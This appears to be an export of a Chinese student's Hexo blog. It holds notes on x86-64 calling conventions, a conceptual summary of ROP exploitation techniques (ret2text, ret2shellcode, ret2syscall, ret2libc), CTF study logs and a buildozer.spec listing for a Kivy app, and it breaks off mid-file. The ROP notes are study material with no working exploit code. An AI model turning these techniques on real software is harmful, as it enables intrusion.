<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code>    strcpy，字符串复制，遇到&#39;\x00&#39;停止
    strcat，字符串拼接，遇到&#39;\x00&#39;停止
    copy
</code></pre>
<h3 id="64位与32位寄存器区别有："><a href="#64位与32位寄存器区别有：" class="headerlink" title="64位与32位寄存器区别有："></a>64位与32位寄存器区别有：</h3><p>64位有16个寄存器，32位只有8个。但是32位前8个都有不同的命名，分别是e _ ，而64位前8个使用了r代替e，也就是r_。<br>e开头的寄存器命名依然可以直接运用于相应寄存器的低32位。而剩下的寄存器名则是从r8 - r15，其低位分别用d，w,b指定长度。</p>
<p>32位使用栈帧来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值。</p>
<p>64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用。</p>
<p>64位支持一些形式的以PC相关的寻址，而32位只有在jmp的时候才会用到这种寻址方式。</p>
<p><img src="/img/64.png"></p>
<h3 id="过程（函数）调用的不同"><a href="#过程（函数）调用的不同" class="headerlink" title="过程（函数）调用的不同"></a>过程（函数）调用的不同</h3><pre><code>参数通过寄存器传递（见前文）
callq 在栈里存放一个8位的返回地址
许多函数不再有栈帧，只有无法将所有本地变量放在寄存器里的才会在栈上分配空间。
函数可以获取到栈至多128字节的空间。这样函数就可以在不更改栈指针的情况下在栈上存储信息（也就是说，可以提前用rsp以下的128字节空间，这段空间被称为red zone，在x86-64里，时刻可用）
不再有栈帧指针。现在栈的位置和栈指针相关。大多数函数在调用的一开始就分配全部所需栈空间，之后保持栈指针不改变。

一些寄存器被设计成为被调用者-存储的寄存器。这些必须在需要改变他们值的时候存储他们并且之后恢复他们。
</code></pre>
<h3 id="参数传递的不同"><a href="#参数传递的不同" class="headerlink" title="参数传递的不同"></a>参数传递的不同</h3><pre><code>6个寄存器用来传递参数（见前文）
剩下的寄存器按照之前的方式传递（不过是与rsp相关了，ebp不再作为栈帧指针，并且从rsp开始第7个参数，rsp+8开始第8个，以此类推）
调用时，rsp向下移动8位（存入返回地址），寄存器参数无影响，第7个及之后的参数现在则是从rsp+8开始第7个，rsp+16开始第8个，以此类推
</code></pre>
<h3 id="栈帧的不同"><a href="#栈帧的不同" class="headerlink" title="栈帧的不同"></a>栈帧的不同</h3><p>很多情况下不再需要栈帧，比如在没有调用别的函数，且寄存器足以存储参数，那么就只需要存储返回地址即可。<br>需要栈帧的情况：</p>
<pre><code>本地变量太多，寄存器不够
一些本地变量是数组或结构体
函数使用了取地址操作符来计算一个本地变量的地址
函数必须用栈传送一些参数给另外一个函数
函数需要保存一些由被调用者存储的寄存器的状态（以便于恢复）
</code></pre>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>飞蓬大将军</title>
    <url>/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/</url>
    <content><![CDATA[<span id="more"></span>
<h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p>
<p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>
]]></content>
      <categories>
        <category>日常闲话</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>大一生活结束了</title>
    <url>/2021/09/28/%E5%A4%A7%E4%B8%80%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c015426add05e765a33876f2aaff71d078629c49f9e87326a4b41eaf70d966eb">7edd006ae50f8a7d3d59bda4b0bd2cebba194e7fdd2d3626eff0cb845a0c5eae8ce6fac015691ba2429c13b85744472bb3856b7bde8de97d312595581fd81ebee0fb2b88122a759b2e0eddbecc730187cb9e83f483a57c8066c830c825c7feb0d7f9f32ef53d0c427b50e859ddc6e63de00f0651cebeb748689cf60a63e1338e7968d93a47cc1808e7e6f403d52813995b2f47d0e455b37bba78c4f371e03f7781030112c2dc7f6b75a08683d2c3aa528420da1a49a5be75796424231f203ab113dd50b45e18ac05e7de758a5a9f42f397752a5228085b26813ae0b4efa741fe31818c670ca244c23b893179c625fb3155424d876f381af4d3bf754821ba911aaa3f31414a8e2d58caa42e451225c65bd13dfd150bb41dfbd7cd5446aab426daff4691f5ae1a943874f0da19ed0d89a8fc971bd59172ca831f864ae950a615edabdb44a1129360156063791aa21601c0e748142768a843bd0f0451f53827363eafa9d9f181d9fc9191f591246101b5a6ccd165b30f0de7e1e00be2b5ee105b3550f3f88543c8d20ba64ad6a7df3a97528ac637cc81ec61a58587b9114c1f9dddbdb5e5c4da3ea16136d769ec93ba86454d8659298346db33165f47623c66bfa66a5f967308c7d4f807dfefc9c0c3ded8c15e0f5506fb4ce6a97ac4472d6e22beb9903d9eb361a46a95837db070425ee591720892d85590779dad73fb1018107a3a7a15fb4543292da1107b52c37dbdc291c1490b8c71b25455410dc3820d39f6d0899a913826cb23eca4c4e306185f4fbc66ee169c7bde55cbb8149264dcaaa4720e94afb2b06ebfc2c17831449079c2bda7c1174070a6cd4466c10023ac872f0ab4cbe40d46e75f3a4a4206e80350cc46f10ee9902722a269774466b1aaddae9ee2a5a03bb09b506ebca26afddd3dd2b2778e0198233f87f14bbe96cd12abe7044f4135ee3eb630cb6cfd10912f6fdca0bf998593398a30dbaad2f9b7e478890a6ce45894600076b252f25eaa2b2ddfa5d37b9f0fdd9899335179f34d6ebb26eb8fccc90db1ba83a23ee4024868da32cafc665e4620aa3cb96a38cf5070dd15dee0189fd7fbaca76b0617ee88da9589fe92eb034b92b41d06ba4374f9af1a25b0adb7096099382a7bc579c0215a97fa42240f8849cfe593ff37d659adada2b44724eec1b2269b41714607401c906883b5b2b6ba9f049443a0ba7b91779e78dccdf582e3d121c4490f8c2b0bb8ebdc45813f6fc83c7ea4634ef390ef05fe95ece1c1de8978660a514581a88c843618b8149230b2953156c2ae8e72c532c399b84db2423e1bbad82c777bd66d0f2725890b5b32c13cb5130d46545e675fddc63f005fffb6c736a2eb89d7706526e5decaed13a1ad0aa1f396ea813bfb932dde87dffb73ac41275f6b0e111d8c3a0b2f4eece0b6a5073edddab2ed3cf2dad3f360ad1cc4e2a8e04bcc468fcaacc5e9189c2f3b88dfcec5aac30a63cf89a3d85d6120f2d2e2dc1e321a9cdacd69cba6a5f2cb89e59efd5f40538077d40efbac207346671ddb3b81942a863d7bd162ab8cf3d6202a08bd47a168952ce10719a68bcfea7df9b989550753d426ce655a5ce512b98a09d7105bacf1d2658895d6b00f7127b8963ec321583e4ef479d0dffbc6e9f79558bf74b92c7471780eee727b3375b787c52e762e6b33f253fd5982382157daef6e4f2009418beadfd6215d8d6fdbb5f3ad5e401ecba0ec6ae536850adac4c40c5e827c36f635feac943e9a74692b2e80817dcf4f535c3074381e2f384fbe58d05f02645552cb71f4ac8f092c414698031c33303b6924afa626746a5ebb6772929fd9f0a1cd6c2397562a190e0c8a00a16fa290c9cc7a02728bbb21916e830743cf32bc9b9b922b2fe228d6b6b9a2c16e6e2457111ba2ca353cc3438e717082029bb02bf5879f26022b8b6ab6575a36645d1f5e56f21b226003881b5392244511e744da1f187bdb5c6672a1577e818d987e7f2196012310a40faab4a4b00ee9410197a72cceb031192d4e64334f5d622add74692f610fda75db798e98b92a0a23b2e904b9719b3842467623848a9db996ba8698c420f827ae07d1201199baf44012ed4f93212df8a9b99bed8ab79836aa5d3754cc550ab261797ceb9803dabe1514ad62015c23675d2290f6807c512f37b18798970583b0d86d7a33e452a69fbe2397d5248acf2c6e7492310ded5589a0c28323d8228c7f16da83b12322c280a0a9c3e5db5c47c5221deace81e21e65de96ca766615650f18ba2d1ad649da18522007b3e5bee95508f5109df0adaf9e82b1ed81d35def07d28d169a5132183b67556a0c8b0af1e7c9cbeb27b4d45e7f924c5fdc71dd95164fda6a54a83ad575f4234789949a30fb978a02dc175954d6e07b9becb9d1f123a55e3371876734de6db670f5e32d4982cbfa5b0d33a90eec624614855890422c279c5726d2ad30b66fab5b8a4d9a33be5ef873f58b89bf4cf22f668b473b3cbff4dbcb9c204695a241b4c67c9e68a545fdfb87c0938ac79850bffa9fc3765cf3634c9628116ecebdcc297b050cdc9032082a595a20ebf024f6905d2e145108e3d85f091244a4825d94983bb93594b75ae235e19867a4c9f8b751bbc3e0eaabc99996b478603806afc4aa77268aefeeba80f1de024da1f7fc5bfd66d6edfac623f931afd0721899667dfdef6829b349835f05a6acbd4ec3cee290e8d7a5d8d1bdd05dc7d078886d89ec80ec2bb41d97252c4f965cb9c0cff4cad0c79f25c32fedcdb3b3f35205bbd8d5f3b26b438e80754593b511d146ec58ba24dafc28b16219c7aa0f8716f0054b6ae05a0f9fa7742738bb9692a69149d9b2450495e44efaebaf52ed1c637ce654a7233a6eca5286bf5988d6d5ff2bf962dd588a48651144939909b7cb153f2353f64290c4308793f8b474643bb3a6253b60139354dcddf5606fc0c9becb730341e48cb040d97ea4b4187881820fea49a429f67b4d860d0a529fad393e801b25b4b86848d93d5fc9281f349e12193ed8507a71150136442d815f30aef4d644dad32d9e33e02802d0d5b113d8f0fcc01645a0c523f4def20c65ed156c695a55a3c028311170c5d05799f5ec13c4fb0ad96e6831890bf60d8f9f496a17425b1017ffce295b990f3cd98a5489a4c9c0a99c1168cbed2cdb418fbe798edbc76008f9af138d7f8406d82832b1e275c438f4b6a854d7498f2a6e67df32e930274c3b72d2af5a22979ce49a9180a7ce99ab45e1100f7d9f6cfa7c56c1fb7a7e302cdb28169496fb7c0f8096c9ed55c07e7aea39afddd3fde6cae4798d76e43de2f9eaf45afc7d7b3fd3891eaf2a02dbf3783d3d2cc57ffbcc35d3f55aa4c43c23e3ea2dd14df7279a80a60d9266c21f49d0b3c02339a3a16f2c91d8a87c06c5f675049f6d4b374c0daf5f54d52a64ddcc4329761b84c9c40b5f3196ec38f23c143aa0f8b93c6359df69af5c325db787274d77f26db9ecee6f13870bb58a1bd3e0b7e5b4a1e9fb7c69d18ba062c511e56d6b90a6327b12d1a19eabb551667c64be1d7806288c40f68ad6a9a17f33c5e3e9f27d20fb2d5d70521120d6f4a79c9a75425e87c4d64e09f5920f2085017a2fd341578ce3d228a6f5ff271c793ea110815b1ca0bc1789582822eeba6530ec9b221d547af1c9ec2db826264c4acc5fb0e9dd2a5e4dcefe5f9b663ca209112c0c85242c989f5f5f5aee2d2380d0664692a027e6170116d0c8f4f8b2341ff5b0bfbc149e63cf6e9d99dbf5b7ce299ab600957603b13af30df691020ee3619c8e5b705a738f952734611d295941f9f1313e6e3275d151943a72ae6fc69dc2b08058aa8016fea8ad75e9c66841f50f4e06eec2514d958285f3e0f8ec6bd8f35fa511adf007e9551e8bf9de691e2fd1f43fd17bde44050c55a250d2ef761d49edc47d9e6f9f209f6f7d3e049217fd0df52caafa51541fa4de21d341b5082da94adf183fbed182bf11638aa8565a6a6161854a1154dc647c4d2c2ffa6d4ee0f78c43f5138c9afc9b8d5a3fc14a5d3370064e8f4bcc22162443f1c98002968975539d499299da40954b7c08c12cba9ce573a43f91f3db55c72289c561549420c534362b48a681e589a4a78e81f6a63018bc36bf78b01a115940cdbdd303cc38bd31401aac7f996f9c24d1aafad7c99d14dfbe60ef6c057dfebaa6420c7a76584d3dd72a94964a798f78d439b018cc7d94303db8f4226569ab51fd00164474c3c675a2693ea5a2762dccc9af9276986c8e0c807efeb115099a97e9a5c5fb06104f58d7afdb93437f1239dbc6f906add6926f733219ba90e6ac4c7712100a0984c57bf8c9e7fa2b8538ea49a261fb1b868123e459b3b6d17354300bb838c3d5791d324ad22979c632691fee5e833040245715955745438d5d5f4390c2ee9aa28ab60fb2bd4509f6afdd8a901eb2624fdf3a7a7093526774c8d04e1e4041a370d3343d444f1ea8e16195f93b303fd47a62180db27ce9cf6196bc0f639dabd9d93293bfd0ee3b57b3755553b0865b9d886b7cc889ada856c66545a2859f938bbcb894488e522899f0073ab0454b8951c08e191d6e8b2b2d5867e89a58dbddba103c23a7bcbf072d57d9e50549b2af3b4b738d3023428b5a5873083585492bd590cd511cf4c1bb6de97a42cfc5cd04fef8c1a82f04a12bfbe304f57b5f94bc07013e9a5033f49cc9b91b8c35f1a7de0a7ae3bc04fef24470aa4eb98d137e4d24ac03568d56c0e3f5c41cccf7a797e62d183e26e44cae335ed6ee454e1894e9a890343f0c9ef91e8adddfe25faf2907213af64e53baa51f08605a19de51be8b0d6e70c5bab4f5469a84ca847221072d3e7bc61eddf16ea8b0f7ae34933820f4c85e69dd346a207ec27fa80a9679a9fd558eb569f8910883e92812a1f9b673f276fac5df50075a019d99b419750f76109e2f3db003fa97bd8eb9b5cfff9df06f06d5c8db460a01498895da42f3935983e2db92f63afce0d1f5ccb04147c0fd40eec550518bbf0a6dc235f4da2046d0709efdcbb1f5cd0b78d803f4875ef0a14a718492be731bb108ae0b6579b41cd70298baa657e87a248def5c0e1915d241f3a2fe35028f28c2d4a1fcc1361d153c829c91066903e9075cfb5b7340088ac2b77ef8847d0d9d16526467ecbe12a962c19f9a039320afba25510a8425f6a20e27df5da28c7af99d3e2def5fc6a5069fa80eeb82b412431b9381283fdfefcd3c0538a559e349c4cee1bbf892d1741ef876dcfb15600fd107d3e120e68088e76c63dede4e199da9b50418569b60ca8afa0cd5520e66511e61068cbedfd495d5b318ac2ad06701390ac38156865796d0e5a8aca8dd7165de4b17db113f31d425e799b934819ac656123dc0e8a53765d93eb9e548ad06700254159eadf7c6256d85d231e2abe2aa2d6a663baf1f8e41236d24a36cab9242362220f2e8828ee6bc0712d7574ecf9c5e5f4d91080344fcad78596105dab983be5ac9844c2ea0857a7ac3ddef23ce2ad608fd873195d8a4a9d369e8ff3550ce0de518161d08f4e62a71da86b13553bbf235c92a266ddfbd749af3e9d81239c1230f8f6c63e4fd97ca5bd2b3d10f96edcd88f81521c53c84564666a0c0b304db3a090452ce995623b896968d3030d54c325ff70a2c469c61461031b53cb90a0995ea6d5e9e09273e813a74b00d248091855d14c03584c79022556a5b9f1c3cf0da0193f5324477bd970bf876e0c6c56bea71ce4f907edb74b6e862707edcf31ee0db53b4beabd7941b178b46790c14fc09fe64b2a77e685e8d3c5527448c89617d44d5e50f3e54d90b86bea45783b59cd4c32693ede25cef0f94ac60d420108dfa5b7c28dcadb2e87819ee842a5cb8e4b6278f728e326aced5ae7788e831c647cbe0357b4e36f9895ec21a7bca25fe5295bb3c379512</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>日常闲话</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>基本ROP</title>
    <url>/2021/06/20/%E5%9F%BA%E6%9C%ACROP/</url>
    <content><![CDATA[<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
<pre><code>程序存在溢出，并且可以控制返回地址。

可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
</code></pre>
<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p>
<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>寒假学习(三)</title>
    <url>/2022/02/06/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%882022.1.31-2022.2.6%EF%BC%89/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="学习进度总结（三）（2022-1-31-2022-2-6）"><a href="#学习进度总结（三）（2022-1-31-2022-2-6）" class="headerlink" title="学习进度总结（三）（2022.1.31-2022.2.6）"></a>学习进度总结（三）（2022.1.31-2022.2.6）</h1><h2 id="作品赛ing"><a href="#作品赛ing" class="headerlink" title="作品赛ing"></a>作品赛ing</h2><p>新年快乐！初一、初二两天有事在成都待了两天，但是没有闲着，一直也在解决打包难的问题。在网上各种找资料，发现用kivy打包apk的事都好久远了，没多少人用，更别说有报错分析的。于是只好自己一步一步摸索，还好功夫不负有心人，初三回家之后基本上算是把buildozer打包问题搞明白了，主要注意<strong>buildozer.spec</strong>文件里面的几个部分必须修改对：</p>
<ol>
<li><p>文件名称</p>
<p>很多时候打包不成功就是因为文件名称对不上main.py里面的函数名，后来每一次都改，也就没有在出过问题。</p>
</li>
<li><p>绝对路径</p>
<p>在配置文件里，main.py的路径一定要填写正确</p>
</li>
<li><p>配置要求</p>
<p>配置文件里面的<strong>requirements</strong>这一部分必须要填写完整，只要整个打包文件夹里包含到的需要使用的一些插件都需要写上，这样在打包时才会下载这些插件，最后打包出来才不会报错，也不会闪退</p>
</li>
<li><p>source.include_exts</p>
<p>这一行内容默认的一般是py,png,jpg,kv,atlas，但是很多时候自己的文件内容可能不止这些文件类型包含，这时候也需要自行添加，否则打包后就会出现闪退现象，例如有ttf格式文件，就加上ttf</p>
</li>
<li><p>网络要求</p>
<p><strong>android.permissions = INTERNET</strong>这一行也是必须打开的，默认前面有#号，是没有使用的，需要自己打开，不然打包好也是闪退</p>
</li>
</ol>
<p>反正问题很多，这也只是我暂时总结出来的一些打包经验，如果后面打包途中再遇上什么问题，我再继续补充……</p>
<p>然后打包之余也有在学习kivy的一些内容，我们现在的项目内容有一个最大的难点就是还没有关键技术，如果一直没有关键技术的话，基本上做出来也不会有多大的作用和效果，所以还得继续钻研，最晚五月份交作品，时间还是挺多的，四个人好好加油，相信一定能攻破难关！</p>
<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>寒假的时间确实大部分都在走亲访友中度过了，再加上作品赛一整，很是没有太多时间拿来学习ctf，hgame就打了第一周的，之后的每周有wp出来我也在看，还是觉得自己学的太浅了，pwn确实是任重道远，我现在的水平无法做到保证在正式比赛中有pwn方向的输出，但是我在尽力调整，争取在下学期国赛等大赛来临之前达到能保证输出的水平，为XJUSEC贡献一份力量！继续加油吧！</p>
]]></content>
      <categories>
        <category>2022</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>寒假学习(一)</title>
    <url>/2022/01/22/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%882022.1.17-2022.1.23%EF%BC%89/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="学习进度总结（一）（2022-1-17-2022-1-23）"><a href="#学习进度总结（一）（2022-1-17-2022-1-23）" class="headerlink" title="学习进度总结（一）（2022.1.17-2022.1.23）"></a>学习进度总结（一）（2022.1.17-2022.1.23）</h1><h2 id="作品赛项目Begin"><a href="#作品赛项目Begin" class="headerlink" title="作品赛项目Begin"></a>作品赛项目Begin</h2><p>13号回家后休息了两天就开始着手正事——创新实践作品赛</p>
<ul>
<li><p>第一次做作品赛项目，说实在的挺无从下手，因为什么经验也没有，先就是组队问题，既然说要实验室成员组队优先，那就熟人组队了。</p>
</li>
<li><p>组好队后开始讨论作品内容，商量半天想到了三个比较好的方案，最后经过讨论，确定下来题目：<strong>手机诈骗钓鱼软件的伪通讯录及ip地址生成</strong></p>
</li>
<li><p>内容确定，大致是要做一个手机app，于是第一个碰上的比较陌生的问题就是安卓打包，我们决定主要用python语言进行编写，找到最好的就是用python的kivy库进行编写，正好有配套的buildozer可以进行软件打包</p>
</li>
<li><p>说干就干，队伍分工，首先让我这个擅长debug的开始着手外包工作，软件打包。果不其然，一开始下载好buildozer就开始报错了，全是bug，一片红，可给我看得头大，慢慢debug吧，是个漫长的过程</p>
</li>
<li><p>经过两天两夜的辛苦debug，遇到最后一个最大的问题就是打包后的软件下载后打开闪退，终于在第三天，传来捷报！外包成功了，进度+1<del>哈哈哈哈</del>！</p>
</li>
<li><p>最强指令：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">buildozer </span>-v <span class="keyword">android </span><span class="built_in">debug</span> run</span><br></pre></td></tr></table></figure></li>
<li><p> 留下buildozer.spec文件的配置 </p>
</li>
</ul>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">[app]</span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Title of your application</span></span><br><span class="line">title = </span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Package name</span></span><br><span class="line">package.name = myapp</span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Package domain (needed for android/ios packaging)</span></span><br><span class="line">package.domain = org.myapp</span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Source code where the main.py live</span></span><br><span class="line">source.dir = </span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Source files to include (let empty to include all the files)</span></span><br><span class="line">source.include_exts = py,png,jpg,kv,atlas</span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of inclusions using pattern matching</span></span><br><span class="line"><span class="meta">#source.include_patterns = assets/*,images/*.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Source files to exclude (let empty to not exclude anything)</span></span><br><span class="line"><span class="meta">#source.exclude_exts = spec</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of directory to exclude (let empty to not exclude anything)</span></span><br><span class="line"><span class="meta">#source.exclude_dirs = tests, bin</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of exclusions using pattern matching</span></span><br><span class="line"><span class="meta">#source.exclude_patterns = license,images/*/*.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Application versioning (method 1)</span></span><br><span class="line">version = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Application versioning (method 2)</span></span><br><span class="line"><span class="meta"># version.regex = __version__ = [&#x27;&quot;](.*)[&#x27;&quot;]</span></span><br><span class="line"><span class="meta"># version.filename = %(source.dir)s/main.py</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Application requirements</span></span><br><span class="line"><span class="meta"># comma separated e.g. requirements = sqlite3,kivy</span></span><br><span class="line">requirements = hostpython3, libffi, openssl, sdl2_image, sdl2_mixer, sdl2_ttf, sqlite3, python3, sdl2, setuptools, six, pyjnius, android, kivy, requests, kivy.app, certifi</span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Custom source folders for requirements</span></span><br><span class="line"><span class="meta"># Sets custom source for any requirements with recipes</span></span><br><span class="line"><span class="meta"># requirements.source.kivy = ../../kivy</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Garden requirements</span></span><br><span class="line"><span class="meta">#garden_requirements =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Presplash of the application</span></span><br><span class="line"><span class="meta">#presplash.filename = %(source.dir)s/data/presplash.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Icon of the application</span></span><br><span class="line"><span class="meta">#icon.filename = %(source.dir)s/icon.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Supported orientation (one of landscape, sensorLandscape, portrait or all)</span></span><br><span class="line">orientation = portrait</span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of service to declare</span></span><br><span class="line"><span class="meta">#services = NAME:ENTRYPOINT_TO_PY,NAME2:ENTRYPOINT2_TO_PY</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># OSX Specific</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># author = © Copyright Info</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># change the major version of python used by the app</span></span><br><span class="line">osx.python_version = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># Kivy version to use</span></span><br><span class="line">osx.kivy_version = <span class="number">1.9</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># Android specific</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Indicate if the application should be fullscreen or not</span></span><br><span class="line">fullscreen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (string) Presplash background color (for new android toolchain)</span></span><br><span class="line"><span class="meta"># Supported formats are: #RRGGBB #AARRGGBB or one of the following names:</span></span><br><span class="line"><span class="meta"># red, blue, green, black, white, gray, cyan, magenta, yellow, lightgray,</span></span><br><span class="line"><span class="meta"># darkgray, grey, lightgrey, darkgrey, aqua, fuchsia, lime, maroon, navy,</span></span><br><span class="line"><span class="meta"># olive, purple, silver, teal.</span></span><br><span class="line"><span class="meta">#android.presplash_color = #FFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (string) Presplash animation using Lottie format.</span></span><br><span class="line"><span class="meta"># see https://lottiefiles.com/ for examples and https://airbnb.design/lottie/</span></span><br><span class="line"><span class="meta"># for general documentation.</span></span><br><span class="line"><span class="meta"># Lottie files can be created using various tools, like Adobe After Effect or Synfig.</span></span><br><span class="line"><span class="meta">#android.presplash_lottie = &quot;path/to/lottie/file.json&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="meta"># (str) Adaptive icon of the application (used if Android API level is 26+ at runtime)</span></span><br><span class="line"><span class="meta">#icon.adaptive_foreground.filename = %(source.dir)s/data/icon_fg.png</span></span><br><span class="line"><span class="meta">#icon.adaptive_background.filename = %(source.dir)s/data/icon_bg.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Permissions</span></span><br><span class="line">android.permissions = INTERNET</span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Target Android API, should be as high as possible.</span></span><br><span class="line"><span class="meta">#android.api = 27</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Minimum API your APK will support.</span></span><br><span class="line"><span class="meta">#android.minapi = 21</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Android SDK version to use</span></span><br><span class="line"><span class="meta">#android.sdk = 20</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android NDK version to use</span></span><br><span class="line"><span class="meta">#android.ndk = 19b</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Android NDK API to use. This is the minimum API your app will support, it should usually match android.minapi.</span></span><br><span class="line"><span class="meta">#android.ndk_api = 21</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Use --private data storage (True) or --dir 